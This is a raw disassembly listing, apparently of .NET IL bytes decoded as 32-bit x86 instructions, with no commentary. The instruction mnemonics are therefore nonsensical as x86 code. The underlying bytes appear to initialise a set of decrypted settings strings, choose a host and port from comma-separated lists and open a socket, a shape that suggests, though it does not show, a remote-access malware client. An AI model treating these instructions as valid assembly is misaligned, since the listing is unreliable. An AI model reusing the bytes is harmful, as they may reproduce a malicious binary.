  4025e6:	7a 03                	jp     0x4025eb
  4025e8:	39 0c 00             	cmp    %ecx,(%eax,%eax,1)
  4025eb:	00 00                	add    %al,(%eax)
  4025ed:	02 20                	add    (%eax),%ah
  4025ef:	c3                   	ret
  4025f0:	00 00                	add    %al,(%eax)
  4025f2:	00 6f ee             	add    %ch,-0x12(%edi)
  4025f5:	00 00                	add    %al,(%eax)
  4025f7:	0a 2a                	or     (%edx),%ch
  4025f9:	02 20                	add    (%eax),%ah
  4025fb:	c2 00 00             	ret    $0x0
  4025fe:	00 6f ee             	add    %ch,-0x12(%edi)
  402601:	00 00                	add    %al,(%eax)
  402603:	0a 2a                	or     (%edx),%ch
  402605:	00 00                	add    %al,(%eax)
  402607:	00 1b                	add    %bl,(%ebx)
  402609:	30 02                	xor    %al,(%edx)
  40260b:	00 c5                	add    %al,%ch
  40260d:	00 00                	add    %al,(%eax)
  40260f:	00 01                	add    %al,(%ecx)
  402611:	00 00                	add    %al,(%eax)
  402613:	11 16                	adc    %edx,(%esi)
  402615:	0a 38                	or     (%eax),%bh
  402617:	0e                   	push   %cs
  402618:	00 00                	add    %al,(%eax)
  40261a:	00 20                	add    %ah,(%eax)
  40261c:	e8 03 00 00 28       	call   0x28402624
  402621:	14 00                	adc    $0x0,%al
  402623:	00 0a                	add    %cl,(%edx)
  402625:	06                   	push   %es
  402626:	17                   	pop    %ss
  402627:	58                   	pop    %eax
  402628:	0a 06                	or     (%esi),%al
  40262a:	7e 11                	jle    0x40263d
  40262c:	00 00                	add    %al,(%eax)
  40262e:	04 28                	add    $0x28,%al
  402630:	15 00 00 0a 32       	adc    $0x320a0000,%eax
  402635:	e5 28                	in     $0x28,%eax
  402637:	03 00                	add    (%eax),%eax
  402639:	00 06                	add    %al,(%esi)
  40263b:	3a 06                	cmp    (%esi),%al
  40263d:	00 00                	add    %al,(%eax)
  40263f:	00 16                	add    %dl,(%esi)
  402641:	28 16                	sub    %dl,(%esi)
  402643:	00 00                	add    %al,(%eax)
  402645:	0a 00                	or     (%eax),%al
  402647:	28 36                	sub    %dh,(%esi)
  402649:	00 00                	add    %al,(%eax)
  40264b:	06                   	push   %es
  40264c:	3a 06                	cmp    (%esi),%al
  40264e:	00 00                	add    %al,(%eax)
  402650:	00 16                	add    %dl,(%esi)
  402652:	28 16                	sub    %dl,(%esi)
  402654:	00 00                	add    %al,(%eax)
  402656:	0a 7e 0c             	or     0xc(%esi),%bh
  402659:	00 00                	add    %al,(%eax)
  40265b:	04 28                	add    $0x28,%al
  40265d:	17                   	pop    %ss
  40265e:	00 00                	add    %al,(%eax)
  402660:	0a 39                	or     (%ecx),%bh
  402662:	05 00 00 00 28       	add    $0x28000000,%eax
  402667:	26 00 00             	add    %al,%es:(%eax)
  40266a:	06                   	push   %es
  40266b:	7e 04                	jle    0x402671
  40266d:	00 00                	add    %al,(%eax)
  40266f:	04 28                	add    $0x28,%al
  402671:	17                   	pop    %ss
  402672:	00 00                	add    %al,(%eax)
  402674:	0a 39                	or     (%ecx),%bh
  402676:	05 00 00 00 28       	add    $0x28000000,%eax
  40267b:	24 00                	and    $0x0,%al
  40267d:	00 06                	add    %al,(%esi)
  40267f:	7e 0f                	jle    0x402690
  402681:	00 00                	add    %al,(%eax)
  402683:	04 28                	add    $0x28,%al
  402685:	17                   	pop    %ss
  402686:	00 00                	add    %al,(%eax)
  402688:	0a 39                	or     (%ecx),%bh
  40268a:	0f 00 00             	sldt   (%eax)
  40268d:	00 28                	add    %ch,(%eax)
  40268f:	30 00                	xor    %al,(%eax)
  402691:	00 06                	add    %al,(%esi)
  402693:	39 05 00 00 00 28    	cmp    %eax,0x28000000
  402699:	3f                   	aas
  40269a:	00 00                	add    %al,(%eax)
  40269c:	06                   	push   %es
  40269d:	28 34 00             	sub    %dh,(%eax,%eax,1)
  4026a0:	00 06                	add    %al,(%esi)
  4026a2:	dd 06                	fldl   (%esi)
  4026a4:	00 00                	add    %al,(%eax)
  4026a6:	00 26                	add    %ah,(%esi)
  4026a8:	dd 00                	fldl   (%eax)
  4026aa:	00 00                	add    %al,(%eax)
  4026ac:	00 00                	add    %al,(%eax)
  4026ae:	28 12                	sub    %dl,(%edx)
  4026b0:	00 00                	add    %al,(%eax)
  4026b2:	06                   	push   %es
  4026b3:	3a 0a                	cmp    (%edx),%cl
  4026b5:	00 00                	add    %al,(%eax)
  4026b7:	00 28                	add    %ch,(%eax)
  4026b9:	1e                   	push   %ds
  4026ba:	00 00                	add    %al,(%eax)
  4026bc:	06                   	push   %es
  4026bd:	28 1b                	sub    %bl,(%ebx)
  4026bf:	00 00                	add    %al,(%eax)
  4026c1:	06                   	push   %es
  4026c2:	dd 06                	fldl   (%esi)
  4026c4:	00 00                	add    %al,(%eax)
  4026c6:	00 26                	add    %ah,(%esi)
  4026c8:	dd 00                	fldl   (%eax)
  4026ca:	00 00                	add    %al,(%eax)
  4026cc:	00 20                	add    %ah,(%eax)
  4026ce:	88 13                	mov    %dl,(%ebx)
  4026d0:	00 00                	add    %al,(%eax)
  4026d2:	28 14 00             	sub    %dl,(%eax,%eax,1)
  4026d5:	00 0a                	add    %cl,(%edx)
  4026d7:	2b d4                	sub    %esp,%edx
  4026d9:	00 00                	add    %al,(%eax)
  4026db:	00 01                	add    %al,(%ecx)
  4026dd:	1c 00                	sbb    $0x0,%al
  4026df:	00 00                	add    %al,(%eax)
  4026e1:	00 33                	add    %dh,(%ebx)
  4026e3:	00 60 93             	add    %ah,-0x6d(%eax)
  4026e6:	00 06                	add    %al,(%esi)
  4026e8:	01 00                	add    %eax,(%eax)
  4026ea:	00 01                	add    %al,(%ecx)
  4026ec:	00 00                	add    %al,(%eax)
  4026ee:	9a 00 19 b3 00 06 01 	lcall  $0x106,$0xb31900
  4026f5:	00 00                	add    %al,(%eax)
  4026f7:	01 1b                	add    %ebx,(%ebx)
  4026f9:	30 02                	xor    %al,(%edx)
  4026fb:	00 2d 01 00 00 02    	add    %ch,0x2000001
  402701:	00 00                	add    %al,(%eax)
  402703:	11 28                	adc    %ebp,(%eax)
  402705:	19 00                	sbb    %eax,(%eax)
  402707:	00 0a                	add    %cl,(%edx)
  402709:	7e 07                	jle    0x402712
  40270b:	00 00                	add    %al,(%eax)
  40270d:	04 28                	add    $0x28,%al
  40270f:	1a 00                	sbb    (%eax),%al
  402711:	00 0a                	add    %cl,(%edx)
  402713:	6f                   	outsl  %ds:(%esi),(%dx)
  402714:	1b 00                	sbb    (%eax),%eax
  402716:	00 0a                	add    %cl,(%edx)
  402718:	80 07 00             	addb   $0x0,(%edi)
  40271b:	00 04 7e             	add    %al,(%esi,%edi,2)
  40271e:	07                   	pop    %es
  40271f:	00 00                	add    %al,(%eax)
  402721:	04 73                	add    $0x73,%al
  402723:	4b                   	dec    %ebx
  402724:	00 00                	add    %al,(%eax)
  402726:	06                   	push   %es
  402727:	80 0d 00 00 04 7e 0d 	orb    $0xd,0x7e040000
  40272e:	00 00                	add    %al,(%eax)
  402730:	04 7e                	add    $0x7e,%al
  402732:	01 00                	add    %eax,(%eax)
  402734:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402737:	4e                   	dec    %esi
  402738:	00 00                	add    %al,(%eax)
  40273a:	06                   	push   %es
  40273b:	80 01 00             	addb   $0x0,(%ecx)
  40273e:	00 04 7e             	add    %al,(%esi,%edi,2)
  402741:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402746:	02 00                	add    (%eax),%al
  402748:	00 04 6f             	add    %al,(%edi,%ebp,2)
  40274b:	4e                   	dec    %esi
  40274c:	00 00                	add    %al,(%eax)
  40274e:	06                   	push   %es
  40274f:	80 02 00             	addb   $0x0,(%edx)
  402752:	00 04 7e             	add    %al,(%esi,%edi,2)
  402755:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  40275a:	03 00                	add    (%eax),%eax
  40275c:	00 04 6f             	add    %al,(%edi,%ebp,2)
  40275f:	4e                   	dec    %esi
  402760:	00 00                	add    %al,(%eax)
  402762:	06                   	push   %es
  402763:	80 03 00             	addb   $0x0,(%ebx)
  402766:	00 04 7e             	add    %al,(%esi,%edi,2)
  402769:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  40276e:	04 00                	add    $0x0,%al
  402770:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402773:	4e                   	dec    %esi
  402774:	00 00                	add    %al,(%eax)
  402776:	06                   	push   %es
  402777:	80 04 00 00          	addb   $0x0,(%eax,%eax,1)
  40277b:	04 7e                	add    $0x7e,%al
  40277d:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402782:	08 00                	or     %al,(%eax)
  402784:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402787:	4e                   	dec    %esi
  402788:	00 00                	add    %al,(%eax)
  40278a:	06                   	push   %es
  40278b:	80 08 00             	orb    $0x0,(%eax)
  40278e:	00 04 7e             	add    %al,(%esi,%edi,2)
  402791:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402796:	0e                   	push   %cs
  402797:	00 00                	add    %al,(%eax)
  402799:	04 6f                	add    $0x6f,%al
  40279b:	4e                   	dec    %esi
  40279c:	00 00                	add    %al,(%eax)
  40279e:	06                   	push   %es
  40279f:	80 0e 00             	orb    $0x0,(%esi)
  4027a2:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027a5:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027aa:	0c 00                	or     $0x0,%al
  4027ac:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4027af:	4e                   	dec    %esi
  4027b0:	00 00                	add    %al,(%eax)
  4027b2:	06                   	push   %es
  4027b3:	80 0c 00 00          	orb    $0x0,(%eax,%eax,1)
  4027b7:	04 7e                	add    $0x7e,%al
  4027b9:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027be:	0f 00 00             	sldt   (%eax)
  4027c1:	04 6f                	add    $0x6f,%al
  4027c3:	4e                   	dec    %esi
  4027c4:	00 00                	add    %al,(%eax)
  4027c6:	06                   	push   %es
  4027c7:	80 0f 00             	orb    $0x0,(%edi)
  4027ca:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027cd:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027d2:	12 00                	adc    (%eax),%al
  4027d4:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4027d7:	4e                   	dec    %esi
  4027d8:	00 00                	add    %al,(%eax)
  4027da:	06                   	push   %es
  4027db:	80 12 00             	adcb   $0x0,(%edx)
  4027de:	00 04 28             	add    %al,(%eax,%ebp,1)
  4027e1:	2d 00 00 06 80       	sub    $0x80060000,%eax
  4027e6:	10 00                	adc    %al,(%eax)
  4027e8:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027eb:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027f0:	0a 00                	or     (%eax),%al
  4027f2:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4027f5:	4e                   	dec    %esi
  4027f6:	00 00                	add    %al,(%eax)
  4027f8:	06                   	push   %es
  4027f9:	80 0a 00             	orb    $0x0,(%edx)
  4027fc:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027ff:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402804:	09 00                	or     %eax,(%eax)
  402806:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402809:	4e                   	dec    %esi
  40280a:	00 00                	add    %al,(%eax)
  40280c:	06                   	push   %es
  40280d:	28 1a                	sub    %bl,(%edx)
  40280f:	00 00                	add    %al,(%eax)
  402811:	0a 73 1c             	or     0x1c(%ebx),%dh
  402814:	00 00                	add    %al,(%eax)
  402816:	0a 80 0b 00 00 04    	or     0x400000b(%eax),%al
  40281c:	28 04 00             	sub    %al,(%eax,%eax,1)
  40281f:	00 06                	add    %al,(%esi)
  402821:	0a dd                	or     %ch,%bl
  402823:	08 00                	or     %al,(%eax)
  402825:	00 00                	add    %al,(%eax)
  402827:	26 16                	es push %ss
  402829:	0a dd                	or     %ch,%bl
  40282b:	00 00                	add    %al,(%eax)
  40282d:	00 00                	add    %al,(%eax)
  40282f:	06                   	push   %es
  402830:	2a 00                	sub    (%eax),%al
  402832:	00 00                	add    %al,(%eax)
  402834:	41                   	inc    %ecx
  402835:	1c 00                	sbb    $0x0,%al
	...
  40283f:	00 23                	add    %ah,(%ebx)
  402841:	01 00                	add    %eax,(%eax)
  402843:	00 23                	add    %ah,(%ebx)
  402845:	01 00                	add    %eax,(%eax)
  402847:	00 08                	add    %cl,(%eax)
  402849:	00 00                	add    %al,(%eax)
  40284b:	00 01                	add    %al,(%ecx)
  40284d:	00 00                	add    %al,(%eax)
  40284f:	01 1b                	add    %ebx,(%ebx)
  402851:	30 04 00             	xor    %al,(%eax,%eax,1)
  402854:	51                   	push   %ecx
  402855:	00 00                	add    %al,(%eax)
  402857:	00 02                	add    %al,(%edx)
  402859:	00 00                	add    %al,(%eax)
  40285b:	11 7e 0b             	adc    %edi,0xb(%esi)
  40285e:	00 00                	add    %al,(%eax)
  402860:	04 6f                	add    $0x6f,%al
  402862:	1d 00 00 0a 6f       	sbb    $0x6f0a0000,%eax
  402867:	1e                   	push   %ds
  402868:	00 00                	add    %al,(%eax)
  40286a:	0a 74 2f 00          	or     0x0(%edi,%ebp,1),%dh
  40286e:	00 01                	add    %al,(%ecx)
  402870:	28 19                	sub    %bl,(%ecx)
  402872:	00 00                	add    %al,(%eax)
  402874:	0a 7e 07             	or     0x7(%esi),%bh
  402877:	00 00                	add    %al,(%eax)
  402879:	04 6f                	add    $0x6f,%al
  40287b:	1f                   	pop    %ds
  40287c:	00 00                	add    %al,(%eax)
  40287e:	0a 28                	or     (%eax),%ch
  402880:	53                   	push   %ebx
  402881:	00 00                	add    %al,(%eax)
  402883:	06                   	push   %es
  402884:	72 01                	jb     0x402887
  402886:	00 00                	add    %al,(%eax)
  402888:	70 28                	jo     0x4028b2
  40288a:	20 00                	and    %al,(%eax)
  40288c:	00 0a                	add    %cl,(%edx)
  40288e:	7e 0a                	jle    0x40289a
  402890:	00 00                	add    %al,(%eax)
  402892:	04 28                	add    $0x28,%al
  402894:	1a 00                	sbb    (%eax),%al
  402896:	00 0a                	add    %cl,(%edx)
  402898:	6f                   	outsl  %ds:(%esi),(%dx)
  402899:	21 00                	and    %eax,(%eax)
  40289b:	00 0a                	add    %cl,(%edx)
  40289d:	0a dd                	or     %ch,%bl
  40289f:	08 00                	or     %al,(%eax)
  4028a1:	00 00                	add    %al,(%eax)
  4028a3:	26 16                	es push %ss
  4028a5:	0a dd                	or     %ch,%bl
  4028a7:	00 00                	add    %al,(%eax)
  4028a9:	00 00                	add    %al,(%eax)
  4028ab:	06                   	push   %es
  4028ac:	2a 00                	sub    (%eax),%al
  4028ae:	00 00                	add    %al,(%eax)
  4028b0:	01 10                	add    %edx,(%eax)
  4028b2:	00 00                	add    %al,(%eax)
  4028b4:	00 00                	add    %al,(%eax)
  4028b6:	00 00                	add    %al,(%eax)
  4028b8:	47                   	inc    %edi
  4028b9:	47                   	inc    %edi
  4028ba:	00 08                	add    %cl,(%eax)
  4028bc:	31 00                	xor    %eax,(%eax)
  4028be:	00 01                	add    %al,(%ecx)
  4028c0:	13 30                	adc    (%eax),%esi
  4028c2:	01 00                	add    %eax,(%eax)
  4028c4:	9d                   	popf
  4028c5:	00 00                	add    %al,(%eax)
  4028c7:	00 00                	add    %al,(%eax)
  4028c9:	00 00                	add    %al,(%eax)
  4028cb:	00 72 0f             	add    %dh,0xf(%edx)
  4028ce:	00 00                	add    %al,(%eax)
  4028d0:	70 80                	jo     0x402852
  4028d2:	01 00                	add    %eax,(%eax)
  4028d4:	00 04 72             	add    %al,(%edx,%esi,2)
  4028d7:	12 01                	adc    (%ecx),%al
  4028d9:	00 70 80             	add    %dh,-0x80(%eax)
  4028dc:	02 00                	add    (%eax),%al
  4028de:	00 04 72             	add    %al,(%edx,%esi,2)
  4028e1:	ed                   	in     (%dx),%eax
  4028e2:	01 00                	add    %eax,(%eax)
  4028e4:	70 80                	jo     0x402866
  4028e6:	03 00                	add    (%eax),%eax
  4028e8:	00 04 72             	add    %al,(%edx,%esi,2)
  4028eb:	a0 02 00 70 80       	mov    0x80700002,%al
  4028f0:	04 00                	add    $0x0,%al
  4028f2:	00 04 72             	add    %al,(%edx,%esi,2)
  4028f5:	53                   	push   %ebx
  4028f6:	03 00                	add    (%eax),%eax
  4028f8:	70 80                	jo     0x40287a
  4028fa:	05 00 00 04 72       	add    $0x72040000,%eax
  4028ff:	67 03 00             	add    (%bx,%si),%eax
  402902:	70 80                	jo     0x402884
  402904:	06                   	push   %es
  402905:	00 00                	add    %al,(%eax)
  402907:	04 72                	add    $0x72,%al
  402909:	69 03 00 70 80 07    	imul   $0x7807000,(%ebx),%eax
  40290f:	00 00                	add    %al,(%eax)
  402911:	04 72                	add    $0x72,%al
  402913:	c3                   	ret
  402914:	03 00                	add    (%eax),%eax
  402916:	70 80                	jo     0x402898
  402918:	08 00                	or     %al,(%eax)
  40291a:	00 04 72             	add    %al,(%edx,%esi,2)
  40291d:	76 04                	jbe    0x402923
  40291f:	00 70 80             	add    %dh,-0x80(%eax)
  402922:	09 00                	or     %eax,(%eax)
  402924:	00 04 72             	add    %al,(%edx,%esi,2)
  402927:	d1 16                	rcll   $1,(%esi)
  402929:	00 70 80             	add    %dh,-0x80(%eax)
  40292c:	0a 00                	or     (%eax),%al
  40292e:	00 04 72             	add    %al,(%edx,%esi,2)
  402931:	84 1e                	test   %bl,(%esi)
  402933:	00 70 80             	add    %dh,-0x80(%eax)
  402936:	0c 00                	or     $0x0,%al
  402938:	00 04 72             	add    %al,(%edx,%esi,2)
  40293b:	37                   	aaa
  40293c:	1f                   	pop    %ds
  40293d:	00 70 80             	add    %dh,-0x80(%eax)
  402940:	0e                   	push   %cs
  402941:	00 00                	add    %al,(%eax)
  402943:	04 72                	add    $0x72,%al
  402945:	ea 1f 00 70 80 0f 00 	ljmp   $0xf,$0x8070001f
  40294c:	00 04 14             	add    %al,(%esp,%edx,1)
  40294f:	80 10 00             	adcb   $0x0,(%eax)
  402952:	00 04 72             	add    %al,(%edx,%esi,2)
  402955:	9d                   	popf
  402956:	20 00                	and    %al,(%eax)
  402958:	70 80                	jo     0x4028da
  40295a:	11 00                	adc    %eax,(%eax)
  40295c:	00 04 72             	add    %al,(%edx,%esi,2)
  40295f:	a1 20 00 70 80       	mov    0x80700020,%eax
  402964:	12 00                	adc    (%eax),%al
  402966:	00 04 2a             	add    %al,(%edx,%ebp,1)
  402969:	00 00                	add    %al,(%eax)
  40296b:	00 1b                	add    %bl,(%ebx)
  40296d:	30 07                	xor    %al,(%edi)
  40296f:	00 f1                	add    %dh,%cl
  402971:	02 00                	add    (%eax),%al
  402973:	00 03                	add    %al,(%ebx)
  402975:	00 00                	add    %al,(%eax)
  402977:	11 18                	adc    %ebx,(%eax)
  402979:	17                   	pop    %ss
  40297a:	1c 73                	sbb    $0x73,%al
  40297c:	22 00                	and    (%eax),%al
  40297e:	00 0a                	add    %cl,(%edx)
  402980:	25 20 00 c8 00       	and    $0xc80020,%eax
  402985:	00 6f 23             	add    %ch,0x23(%edi)
  402988:	00 00                	add    %al,(%eax)
  40298a:	0a 25 20 00 c8 00    	or     0xc80020,%ah
  402990:	00 6f 24             	add    %ch,0x24(%edi)
  402993:	00 00                	add    %al,(%eax)
  402995:	0a 28                	or     (%eax),%ch
  402997:	07                   	pop    %es
  402998:	00 00                	add    %al,(%eax)
  40299a:	06                   	push   %es
  40299b:	7e 0e                	jle    0x4029ab
  40299d:	00 00                	add    %al,(%eax)
  40299f:	04 72                	add    $0x72,%al
  4029a1:	54                   	push   %esp
  4029a2:	21 00                	and    %eax,(%eax)
  4029a4:	70 28                	jo     0x4029ce
  4029a6:	25 00 00 0a 39       	and    $0x390a0000,%eax
  4029ab:	e3 00                	jecxz  0x4029ad
  4029ad:	00 00                	add    %al,(%eax)
  4029af:	7e 02                	jle    0x4029b3
  4029b1:	00 00                	add    %al,(%eax)
  4029b3:	04 17                	add    $0x17,%al
  4029b5:	8d 39                	lea    (%ecx),%edi
  4029b7:	00 00                	add    %al,(%eax)
  4029b9:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4029bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4029c0:	26 00 00             	add    %al,%es:(%eax)
  4029c3:	0a 73 27             	or     0x27(%ebx),%dh
  4029c6:	00 00                	add    %al,(%eax)
  4029c8:	0a 7e 02             	or     0x2(%esi),%bh
  4029cb:	00 00                	add    %al,(%eax)
  4029cd:	04 17                	add    $0x17,%al
  4029cf:	8d 39                	lea    (%ecx),%edi
  4029d1:	00 00                	add    %al,(%eax)
  4029d3:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4029d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4029da:	26 00 00             	add    %al,%es:(%eax)
  4029dd:	0a 8e 69 6f 28 00    	or     0x286f69(%esi),%cl
  4029e3:	00 0a                	add    %cl,(%edx)
  4029e5:	9a 0a 7e 01 00 00 04 	lcall  $0x400,$0x17e0a
  4029ec:	17                   	pop    %ss
  4029ed:	8d 39                	lea    (%ecx),%edi
  4029ef:	00 00                	add    %al,(%eax)
  4029f1:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4029f7:	6f                   	outsl  %ds:(%esi),(%dx)
  4029f8:	26 00 00             	add    %al,%es:(%eax)
  4029fb:	0a 73 27             	or     0x27(%ebx),%dh
  4029fe:	00 00                	add    %al,(%eax)
  402a00:	0a 7e 01             	or     0x1(%esi),%bh
  402a03:	00 00                	add    %al,(%eax)
  402a05:	04 17                	add    $0x17,%al
  402a07:	8d 39                	lea    (%ecx),%edi
  402a09:	00 00                	add    %al,(%eax)
  402a0b:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  402a11:	6f                   	outsl  %ds:(%esi),(%dx)
  402a12:	26 00 00             	add    %al,%es:(%eax)
  402a15:	0a 8e 69 6f 28 00    	or     0x286f69(%esi),%cl
  402a1b:	00 0a                	add    %cl,(%edx)
  402a1d:	9a 28 15 00 00 0a 0b 	lcall  $0xb0a,$0x1528
  402a24:	06                   	push   %es
  402a25:	28 1c 00             	sub    %bl,(%eax,%eax,1)
  402a28:	00 06                	add    %al,(%esi)
  402a2a:	39 52 00             	cmp    %edx,0x0(%edx)
  402a2d:	00 00                	add    %al,(%eax)
  402a2f:	06                   	push   %es
  402a30:	28 29                	sub    %ch,(%ecx)
  402a32:	00 00                	add    %al,(%eax)
  402a34:	0a 0c 16             	or     (%esi,%edx,1),%cl
  402a37:	0d 38 39 00 00       	or     $0x3938,%eax
  402a3c:	00 08                	add    %cl,(%eax)
  402a3e:	09 a3 32 00 00 01    	or     %esp,0x1000032(%ebx)
  402a44:	13 04 28             	adc    (%eax,%ebp,1),%eax
  402a47:	06                   	push   %es
  402a48:	00 00                	add    %al,(%eax)
  402a4a:	06                   	push   %es
  402a4b:	11 04 07             	adc    %eax,(%edi,%eax,1)
  402a4e:	6f                   	outsl  %ds:(%esi),(%dx)
  402a4f:	2a 00                	sub    (%eax),%al
  402a51:	00 0a                	add    %cl,(%edx)
  402a53:	28 06                	sub    %al,(%esi)
  402a55:	00 00                	add    %al,(%eax)
  402a57:	06                   	push   %es
  402a58:	6f                   	outsl  %ds:(%esi),(%dx)
  402a59:	2b 00                	sub    (%eax),%eax
  402a5b:	00 0a                	add    %cl,(%edx)
  402a5d:	39 05 00 00 00 dd    	cmp    %eax,0xdd000000
  402a63:	c3                   	ret
  402a64:	00 00                	add    %al,(%eax)
  402a66:	00 dd                	add    %bl,%ch
  402a68:	06                   	push   %es
  402a69:	00 00                	add    %al,(%eax)
  402a6b:	00 26                	add    %ah,(%esi)
  402a6d:	dd 00                	fldl   (%eax)
  402a6f:	00 00                	add    %al,(%eax)
  402a71:	00 09                	add    %cl,(%ecx)
  402a73:	17                   	pop    %ss
  402a74:	58                   	pop    %eax
  402a75:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  402a7a:	32 c1                	xor    %cl,%al
  402a7c:	38 a9 00 00 00 28    	cmp    %ch,0x28000000(%ecx)
  402a82:	06                   	push   %es
  402a83:	00 00                	add    %al,(%eax)
  402a85:	06                   	push   %es
  402a86:	06                   	push   %es
  402a87:	07                   	pop    %es
  402a88:	6f                   	outsl  %ds:(%esi),(%dx)
  402a89:	2c 00                	sub    $0x0,%al
  402a8b:	00 0a                	add    %cl,(%edx)
  402a8d:	38 98 00 00 00 73    	cmp    %bl,0x73000000(%eax)
  402a93:	2d 00 00 0a 13       	sub    $0x130a0000,%eax
  402a98:	05 72 67 03 00       	add    $0x36772,%eax
  402a9d:	70 72                	jo     0x402b11
  402a9f:	67 03 00             	add    (%bx,%si),%eax
  402aa2:	70 73                	jo     0x402b17
  402aa4:	2e 00 00             	add    %al,%cs:(%eax)
  402aa7:	0a 13                	or     (%ebx),%dl
  402aa9:	06                   	push   %es
  402aaa:	11 05 11 06 6f 2f    	adc    %eax,0x2f6f0611
  402ab0:	00 00                	add    %al,(%eax)
  402ab2:	0a 11                	or     (%ecx),%dl
  402ab4:	05 7e 0e 00 00       	add    $0xe7e,%eax
  402ab9:	04 6f                	add    $0x6f,%al
  402abb:	30 00                	xor    %al,(%eax)
  402abd:	00 0a                	add    %cl,(%edx)
  402abf:	17                   	pop    %ss
  402ac0:	8d 38                	lea    (%eax),%edi
  402ac2:	00 00                	add    %al,(%eax)
  402ac4:	01 25 16 72 5e 21    	add    %esp,0x215e7216
  402aca:	00 70 a2             	add    %dh,-0x5e(%eax)
  402acd:	16                   	push   %ss
  402ace:	6f                   	outsl  %ds:(%esi),(%dx)
  402acf:	31 00                	xor    %eax,(%eax)
  402ad1:	00 0a                	add    %cl,(%edx)
  402ad3:	13 07                	adc    (%edi),%eax
  402ad5:	11 07                	adc    %eax,(%edi)
  402ad7:	16                   	push   %ss
  402ad8:	a3 38 00 00 01       	mov    %eax,0x1000038
  402add:	80 02 00             	addb   $0x0,(%edx)
  402ae0:	00 04 11             	add    %al,(%ecx,%edx,1)
  402ae3:	07                   	pop    %es
  402ae4:	73 27                	jae    0x402b0d
  402ae6:	00 00                	add    %al,(%eax)
  402ae8:	0a 17                	or     (%edi),%dl
  402aea:	11 07                	adc    %eax,(%edi)
  402aec:	8e 69 6f             	mov    0x6f(%ecx),%gs
  402aef:	32 00                	xor    (%eax),%al
  402af1:	00 0a                	add    %cl,(%edx)
  402af3:	a3 38 00 00 01       	mov    %eax,0x1000038
  402af8:	80 01 00             	addb   $0x0,(%ecx)
  402afb:	00 04 28             	add    %al,(%eax,%ebp,1)
  402afe:	06                   	push   %es
  402aff:	00 00                	add    %al,(%eax)
  402b01:	06                   	push   %es
  402b02:	7e 02                	jle    0x402b06
  402b04:	00 00                	add    %al,(%eax)
  402b06:	04 7e                	add    $0x7e,%al
  402b08:	01 00                	add    %eax,(%eax)
  402b0a:	00 04 28             	add    %al,(%eax,%ebp,1)
  402b0d:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
  402b12:	2c 00                	sub    $0x0,%al
  402b14:	00 0a                	add    %cl,(%edx)
  402b16:	dd 0f                	fisttpll (%edi)
  402b18:	00 00                	add    %al,(%eax)
  402b1a:	00 11                	add    %dl,(%ecx)
  402b1c:	05 39 07 00 00       	add    $0x739,%eax
  402b21:	00 11                	add    %dl,(%ecx)
  402b23:	05 6f 33 00 00       	add    $0x336f,%eax
  402b28:	0a dc                	or     %ah,%bl
  402b2a:	28 06                	sub    %al,(%esi)
  402b2c:	00 00                	add    %al,(%eax)
  402b2e:	06                   	push   %es
  402b2f:	6f                   	outsl  %ds:(%esi),(%dx)
  402b30:	2b 00                	sub    (%eax),%eax
  402b32:	00 0a                	add    %cl,(%edx)
  402b34:	39 18                	cmp    %ebx,(%eax)
  402b36:	01 00                	add    %eax,(%eax)
  402b38:	00 17                	add    %dl,(%edi)
  402b3a:	28 13                	sub    %dl,(%ebx)
  402b3c:	00 00                	add    %al,(%eax)
  402b3e:	06                   	push   %es
  402b3f:	28 06                	sub    %al,(%esi)
  402b41:	00 00                	add    %al,(%eax)
  402b43:	06                   	push   %es
  402b44:	17                   	pop    %ss
  402b45:	73 34                	jae    0x402b7b
  402b47:	00 00                	add    %al,(%eax)
  402b49:	0a 16                	or     (%esi),%dl
  402b4b:	14 fe                	adc    $0xfe,%al
  402b4d:	06                   	push   %es
  402b4e:	1d 00 00 06 73       	sbb    $0x73060000,%eax
  402b53:	35 00 00 0a 73       	xor    $0x730a0000,%eax
  402b58:	36 00 00             	add    %al,%ss:(%eax)
  402b5b:	0a 28                	or     (%eax),%ch
  402b5d:	09 00                	or     %eax,(%eax)
  402b5f:	00 06                	add    %al,(%esi)
  402b61:	28 08                	sub    %cl,(%eax)
  402b63:	00 00                	add    %al,(%eax)
  402b65:	06                   	push   %es
  402b66:	28 06                	sub    %al,(%esi)
  402b68:	00 00                	add    %al,(%eax)
  402b6a:	06                   	push   %es
  402b6b:	6f                   	outsl  %ds:(%esi),(%dx)
  402b6c:	37                   	aaa
  402b6d:	00 00                	add    %al,(%eax)
  402b6f:	0a 6f 38             	or     0x38(%edi),%ch
  402b72:	00 00                	add    %al,(%eax)
  402b74:	0a 17                	or     (%edi),%dl
  402b76:	8d 39                	lea    (%ecx),%edi
  402b78:	00 00                	add    %al,(%eax)
  402b7a:	01 25 16 1f 3a 9d    	add    %esp,0x9d3a1f16
  402b80:	6f                   	outsl  %ds:(%esi),(%dx)
  402b81:	26 00 00             	add    %al,%es:(%eax)
  402b84:	0a 16                	or     (%esi),%dl
  402b86:	a3 38 00 00 01       	mov    %eax,0x1000038
  402b8b:	14 20                	adc    $0x20,%al
